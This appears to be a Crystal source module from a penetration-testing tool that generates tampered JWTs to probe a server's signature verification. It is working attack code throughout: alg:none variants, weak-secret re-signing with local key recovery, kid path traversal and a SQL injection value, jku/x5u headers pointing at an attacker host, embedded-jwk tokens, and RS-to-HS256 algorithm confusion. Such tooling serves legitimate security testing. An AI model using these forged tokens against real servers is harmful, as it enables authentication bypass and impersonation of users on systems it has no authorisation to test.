require "base64"
require "json"

module Gori
  # Testing-payload generator: given a JWT, produce the family of tampered tokens a tester
  # would hand-craft to probe a server's verification logic. Deterministic (no wall clock)
  # and raises only when the caller supplied a key that will not load — an undecodable token
  # just yields an empty list. Four families: alg:none / signature-strip, weak-secret HS
  # re-sign, header-parameter injection, and (only with an operator-supplied public key)
  # algorithm confusion. Signing reuses `Jwt.sign` (see forge.cr).
  module Jwt
    extend self

    # One generated payload: a short `name`, its `category` (for grouping/colour), the
    # tampered `token`, and a `note` explaining what server behaviour it probes.
    #
    # `verified` is the weak-secret family's answer to the question the family exists to ask.
    # It is true on the row whose dictionary key REPRODUCES the input token's own signature —
    # i.e. gori has just recovered the server's HMAC key, and the row is no longer a probe to
    # go try but a finding. Last, with a default, so every other family's `Attack.new` and
    # every consumer that predates it are unchanged.
    record Attack,
      name : String,
      category : String,
      token : String,
      note : String,
      verified : Bool = false

    # The dictionary the weak-secret family re-signs with (HS256). Small on purpose — the
    # point is "is the key one of these obvious values", not a brute-force. "" first: an
    # empty HMAC key is a real misconfiguration and the /dev/null kid trick relies on it.
    WEAK_SECRETS = ["", "secret", "password", "changeme", "admin", "key", "jwt", "123456",
                    "secretkey", "test", "root", "your-256-bit-secret"]

    # Every attack token for `token`, grouped by family in a stable order. Empty when the
    # input isn't a structurally-decodable JWT (need ≥2 segments and a JSON-object header).
    #
    # `public_key` is the server's VERIFICATION key (a PEM public key, a certificate, or a
    # path to either) and unlocks the algorithm-confusion family — the one attack here that
    # cannot be generated from the token alone, because its HMAC secret IS the key's bytes.
    # A key that will not load raises ForgeError: the operator named it, so a typo is theirs
    # to see, not something to drop three payloads over in silence.
    def attacks(token : String, public_key : String? = nil) : Array(Attack)
      list = [] of Attack
      t = token.strip
      # A JWE has five segments and a header that decodes cleanly, so every gate below would
      # pass — and then splice its WRAPPED KEY in as `payload_seg`. There is no claims
      # segment to tamper with and no signature to strip: refuse the whole generator.
      return list if Jwe.jwe?(t)
      parts = t.split('.')
      return list unless parts.size >= 2
      header_seg, payload_seg = parts[0], parts[1]
      header = decode_header(header_seg)
      return list unless header

      none_family(list, header, header_seg, payload_seg)
      weak_secret_family(list, header, payload_seg, signature_of(parts), header_seg)
      header_injection_family(list, header, payload_seg)
      alg_confusion_family(list, header, payload_seg, public_key) if public_key.presence
      list
    end

    # The token's own signature segment, or nil when there is none to check a key against —
    # a 2-part token, or a 3-part one whose signature segment is empty (an `alg=none` token,
    # which no HMAC key "verifies").
    private def signature_of(parts : Array(String)) : String?
      return nil unless parts.size >= 3
      sig = parts[2]
      sig.empty? ? nil : sig
    end

    # Does `secret` reproduce this token's OWN signature? The real verification, not a compare
    # of the generated token against the input:
    #
    #   * over the ORIGINAL `header_seg.payload_seg`, never the re-serialized header —
    #     `header.dup.to_json` need not reproduce the captured header's byte order or spacing,
    #     so comparing generated tokens would miss the match on any token whose header gori
    #     does not happen to re-emit identically;
    #   * under the token's DECLARED alg, never `weak_secret_alg`'s. That one falls back to
    #     HS256 for an RS256/ES256 token, which is right for generating a downgrade PROBE and
    #     wrong for claiming a key was found — an HMAC coincidence over an RSA signature says
    #     nothing about the server's key. So: HS* only, and only the one the token declares.
    private def hs_secret_verifies?(header, header_seg : String, payload_seg : String,
                                    signature : String?, secret : String) : Bool
      return false unless sig = signature
      declared = header["alg"]?.try(&.as_s?).try(&.upcase)
      return false unless declared && HMAC_DIGEST.has_key?(declared)
      sign("#{header_seg}.#{payload_seg}", declared, secret) == sig
    rescue
      false
    end

    # --- family 1: alg:none + signature strip ------------------------------------
    # Servers that honour `alg` from the token itself accept an unsigned token; the case
    # variants dodge naive `alg == "none"` denylists. Also the two signature-removal shapes.
    private def none_family(list, header, header_seg : String, payload_seg : String) : Nil
      %w[none None NONE nOnE].each do |a|
        h = header.dup
        h["alg"] = JSON::Any.new(a)
        list << Attack.new("alg=#{a}", "none",
          "#{b64url(h.to_json)}.#{payload_seg}.",
          "unsigned; accepted if the server trusts alg=#{a} from the token")
      end
      list << Attack.new("signature stripped", "none",
        "#{header_seg}.#{payload_seg}.",
        "original header, empty signature segment (3-part)")
      list << Attack.new("no signature segment", "none",
        "#{header_seg}.#{payload_seg}",
        "2-part token — signature segment removed entirely")
    end

    # --- family 2: weak-secret HS re-sign ----------------------------------------
    # Re-sign under each dictionary key; whichever the server accepts reveals its secret.
    # The re-sign uses the token's OWN HS algorithm when it declares one, so an HS384/HS512
    # token's payloads actually verify on a server that pins that alg — signing them HS256
    # (the old hardcoded choice) made every weak-secret payload for a non-HS256 token fail
    # the alg check regardless of the key, so the "verifies if the key is X" note was a lie
    # there. A token that isn't HS* (none/RS/ES/PS) falls back to HS256: the classic
    # downgrade-to-HMAC-with-a-weak-key probe.
    # Each key is also CHECKED against the input token, not merely re-signed with. gori already
    # computed everything the check needs, and said nothing: for a token signed with "secret",
    # the `secret=secret` row's signature was byte-equal to the token's own and the operator
    # was told "verifies if the server's HMAC key is …" — an invitation to go send a request
    # and find out what gori had already proved locally. `verified` says it instead.
    private def weak_secret_family(list, header, payload_seg : String,
                                   signature : String?, header_seg : String) : Nil
      alg = weak_secret_alg(header)
      WEAK_SECRETS.each do |secret|
        h = header.dup
        h["alg"] = JSON::Any.new(alg)
        signing_input = "#{b64url(h.to_json)}.#{payload_seg}"
        shown = secret.empty? ? "(empty)" : secret
        named = secret.empty? ? "empty" : secret.inspect
        found = hs_secret_verifies?(header, header_seg, payload_seg, signature, secret)
        note = if found
                 "SECRET FOUND — this token's own signature verifies with #{named}; " \
                 "forge any claims with `--encode --secret #{shown}`"
               else
                 "verifies if the server's HMAC key is #{named}"
               end
        list << Attack.new("#{alg} secret=#{shown}", "weak-secret",
          "#{signing_input}.#{sign(signing_input, alg, secret)}", note, found)
      end
    end

    # The HS algorithm to re-sign the weak-secret family under: the token's declared alg when
    # it is one of the HMAC family (matched case-insensitively, emitted in canonical form), so
    # the re-signs verify on a server that pins that alg; HS256 otherwise.
    private def weak_secret_alg(header : Hash(String, JSON::Any)) : String
      case header["alg"]?.try(&.as_s?).try(&.upcase)
      when "HS384" then "HS384"
      when "HS512" then "HS512"
      else              "HS256"
      end
    end

    # --- family 3: header-parameter injection ------------------------------------
    # kid/jku/x5u/jwk drive the server's KEY RESOLUTION. Most can't be locally signed
    # (the resolved key is attacker-hosted), so they carry an unsigned/none signature plus
    # a note on how to complete the attack. The /dev/null kid is the exception: it points
    # the server at an empty file, so an HS256 sign with an EMPTY key actually verifies.
    private def header_injection_family(list, header, payload_seg : String) : Nil
      # kid → /dev/null: empty key file → HMAC("") verifies.
      dn = header.dup
      dn["alg"] = JSON::Any.new("HS256")
      dn["kid"] = JSON::Any.new("../../../../../../../../dev/null")
      dn_input = "#{b64url(dn.to_json)}.#{payload_seg}"
      list << Attack.new("kid=/dev/null", "header-inject",
        "#{dn_input}.#{sign(dn_input, "HS256", "")}",
        "kid path-traversal to an empty file → HMAC with an empty key verifies")

      # kid SQL injection — probes a DB-backed key lookup.
      list << injected(header, payload_seg, "kid SQLi", "kid",
        "x' UNION SELECT 'attacker",
        "kid used in a SQL key lookup; craft the UNION to return a known key")

      # jku / x5u — the server fetches a JWKS / cert chain from an attacker URL.
      list << injected(header, payload_seg, "jku (attacker JWKS)", "jku",
        "https://attacker.example/.well-known/jwks.json",
        "host a JWKS with your public key at the jku URL, sign with its private key")
      list << injected(header, payload_seg, "x5u (attacker cert)", "x5u",
        "https://attacker.example/x5u.pem",
        "host a cert chain at the x5u URL, sign with its private key")

      # jwk — an embedded public key the server may trust blindly.
      jwk = JSON::Any.new({
        "kty" => JSON::Any.new("RSA"),
        "kid" => JSON::Any.new("attacker"),
        "use" => JSON::Any.new("sig"),
        "n"   => JSON::Any.new("<your-modulus-base64url>"),
        "e"   => JSON::Any.new("AQAB"),
      })
      j = header.dup
      j["jwk"] = jwk
      list << Attack.new("jwk (embedded key)", "header-inject",
        "#{b64url(j.to_json)}.#{payload_seg}.",
        "server may trust the embedded jwk; sign with the matching private key")
    end

    # --- family 4: algorithm confusion (asymmetric verify → HMAC) ----------------
    # A server that reads `alg` off the token and dispatches on it will hand an HS256 token to
    # its HMAC verifier with whatever key it holds for that issuer — and for an RS/PS/ES token
    # that key is the PUBLIC one, which the attacker also has. So: re-sign the claims HS256
    # using the public key's own bytes as the HMAC secret.
    #
    # This is the one family that needs material from outside the token, which is why it is
    # opt-in. The bytes matter more than the key: a server holds whatever its config loaded, so
    # each spelling of the same key is its own payload — the canonical SPKI PEM OpenSSL would
    # write (which is also how a CERTIFICATE the operator supplied gets reduced to its public
    # half), and the same text with and without a trailing newline, the difference between
    # `File.read` and a stripped config value.
    #
    # HS256 for every variant, not the digest-matched HS384/HS512: the server picks its MAC
    # from the token's `alg`, all three are available to it, and HS256 is the shape every
    # writeup and every server-side denylist is phrased against.
    private def alg_confusion_family(list, header, payload_seg : String, public_key : String?) : Nil
      return unless spec = public_key
      declared = header["alg"]?.try(&.as_s?).try(&.upcase)
      return unless declared && {"RS", "PS", "ES"}.includes?(declared[0, 2])
      canonical = Asym.public_spki_pem(spec)
      given = Asym.pem_for(spec)
      seen = Set(String).new
      {
        {"canonical SPKI PEM", canonical},
        {"as supplied", given},
        {"no trailing newline", given.chomp},
        {"trailing newline", given.chomp + "\n"},
      }.each do |(label, secret)|
        next unless seen.add?(secret)
        h = header.dup
        h["alg"] = JSON::Any.new("HS256")
        signing_input = "#{b64url(h.to_json)}.#{payload_seg}"
        list << Attack.new("HS256 = public key (#{label})", "alg-confusion",
          "#{signing_input}.#{sign(signing_input, "HS256", secret)}",
          "#{declared} downgraded to HS256, HMAC-keyed with the public key itself; " \
          "accepted if the server dispatches on the token's alg and reuses its verification key")
      end
    end

    # A header-injection token that keeps the original alg/signature-empty and just splices
    # in one header parameter — the signature is left empty because completing it needs the
    # attacker-resolved key (see the note).
    private def injected(header, payload_seg : String, name : String, key : String,
                         value : String, note : String) : Attack
      h = header.dup
      h[key] = JSON::Any.new(value)
      Attack.new(name, "header-inject", "#{b64url(h.to_json)}.#{payload_seg}.", note)
    end

    private def decode_header(seg : String) : Hash(String, JSON::Any)?
      JSON.parse(String.new(Base64.decode(seg))).as_h
    rescue
      nil
    end
  end
end
